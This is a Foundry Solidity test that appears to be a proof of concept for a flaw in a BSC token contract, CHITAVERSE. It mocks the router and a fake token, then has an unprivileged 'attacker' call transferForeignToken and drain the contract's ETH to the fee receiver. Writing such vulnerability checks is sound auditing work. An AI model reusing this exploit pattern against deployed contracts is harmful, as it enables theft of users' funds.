// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CHITAVERSE.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123);
    }
}

contract MockRouter {
    address public factory;
}

contract TransferForeignTokenTestFixed is Test {
    CHITAVERSE token;
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB_ADDRESS = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address owner = address(0x1);
    address devFeeReceiver = address(0x2);
    address attacker = address(0x3);
    address maliciousToken = address(0xDEAD);
    uint256 initialContractBalance = 2 ether;

    function setUp() public {
        // Deploy mock factory
        MockFactory mockFactory = new MockFactory();
        address mockFactoryAddress = address(mockFactory);

        // Deploy mock router code pattern
        MockRouter mockRouter = new MockRouter();
        bytes memory routerCode = address(mockRouter).code;

        // "Deploy" mock router to hardcoded address
        vm.etch(ROUTER_ADDRESS, routerCode);
        // Link router to factory
        vm.store(
            ROUTER_ADDRESS,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(mockFactoryAddress)))
        );

        // Create token as owner
        vm.startPrank(owner);
        token = new CHITAVERSE();
        token.setFeeReceiver(address(0), devFeeReceiver);
        vm.stopPrank();

        // Fund token contract with Ether
        vm.deal(address(token), initialContractBalance);
    }

    function test_TransferForeignTokenVulnerability() public {
        // Mock ERC20 balance call
        vm.mockCall(
            maliciousToken,
            abi.encodeWithSelector(IBEP20.balanceOf.selector, address(token)),
            abi.encode(initialContractBalance)
        );

        console.log("--- BEFORE-Trigger Balances ---");
        uint256 initialDevBalance = devFeeReceiver.balance;
        uint256 initialTokenBalance = address(token).balance;
        console.log("Token contract ETH balance: %s", initialTokenBalance);
        console.log("devFeeReceiver ETH balance: %s", initialDevBalance);

        console.log("--- Trigger transferForeignToken ---");
        // Attacker triggers vulnerability
        vm.prank(attacker);
        token.transferForeignToken(maliciousToken);

        console.log("--- AFTER-Trigger Balances ---");
        uint256 finalTokenBalance = address(token).balance;
        uint256 finalDevBalance = devFeeReceiver.balance;
        console.log("Token contract ETH balance: %s", finalTokenBalance);
        console.log("devFeeReceiver ETH balance: %s", finalDevBalance);

        uint256 tokenChange = initialTokenBalance - finalTokenBalance;
        uint256 devChange = finalDevBalance - initialDevBalance;
        console.log("Token balance change: -%s", tokenChange);
        console.log("devFeeReceiver balance change: +%s", devChange);

        // Vulnerability exists if both changes exactly match the initial balance
        bool vulnerabilityExists = (tokenChange == initialContractBalance) && 
                                   (devChange == initialContractBalance);

        // Print final verdict condition
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: %s ETH was drained from token contract to devFeeReceiver", initialContractBalance);
        } else {
            console.log("Vulnerability not Exist: Expected ETH movement of %s, but got tokenChange=%s, devChange=%s", 
                          initialContractBalance, tokenChange, devChange);
        }
    }
}